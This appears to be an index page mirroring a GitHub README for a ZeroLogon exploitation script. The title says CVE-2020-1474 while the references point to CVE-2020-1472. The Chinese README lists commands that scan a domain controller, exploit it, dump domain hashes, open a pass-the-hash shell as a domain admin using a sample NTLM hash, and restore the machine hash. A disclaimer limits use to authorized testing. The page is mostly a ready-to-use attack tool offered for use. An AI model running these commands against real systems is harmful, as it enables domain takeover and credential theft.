# CVE-2020-1474

ZeroLogon exploitation script,One-click recovery of domain controller machine Hash

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/zha0](https://github.com/zha0) |
| Url      | [https://github.com/zha0/CVE-2020-1474](https://github.com/zha0/CVE-2020-1474)                                               |
| Stars    | 0                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# ZeroLogon exploitation script

## 简介与使用

集合检测与利用一体脚本，节省攻防中漏洞利用的时间，使用方式如下

```
1.扫描
python zerologon_exploit.py dc_ip -scan

2.漏洞利用
python zerologon_exploit.py dc_ip -exp
python zerologon_exploit.py dc_ip -exp -user user #dump域内指定用户

3.pth登录域控
python zerologon_exploit.py dc_ip -shell
python zerologon_exploit.py dc_ip -shell -user domain_admins
python zerologon_exploit.py dc_ip -shell -user domain_admins -hashes aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b #若dc_name.ntds中没有该域管hash可以进行指定

4.恢复域控机器hash
python zerologon_exploit.py dc_ip -recovery
python zerologon_exploit.py dc_ip -recovery -user domain_admins
python zerologon_exploit.py dc_ip -recovery -user domain_admins -hashes aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b #若dc_name.ntds中没有该域管hash可以进行指定

pth和恢复域控机器Hash默认使用administrator进行操作，如真实环境没有该账户，则可-user指定域管账户
```



## 参考链接

https://github.com/SecuraBV/CVE-2020-1472

https://github.com/risksense/zerologon

https://github.com/bb00/zer0dump

https://github.com/SecureAuthCorp/impacket

## 免责声明

本工具仅面向**合法授权**的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标进行扫描。**

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。

在安装并使用本工具前，请您**务必审慎阅读、充分理解各条款内容**，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。



## Get the content

```
git clone https://github.com/zha0/CVE-2020-1474
cd CVE-2020-1474
```

{% embed url="https://github.com/zha0/CVE-2020-1474" %}

<figure><img src="https://avatars.githubusercontent.com/u/5314165?v=4" alt=""><figcaption><p>zha0</p></figcaption></figure>
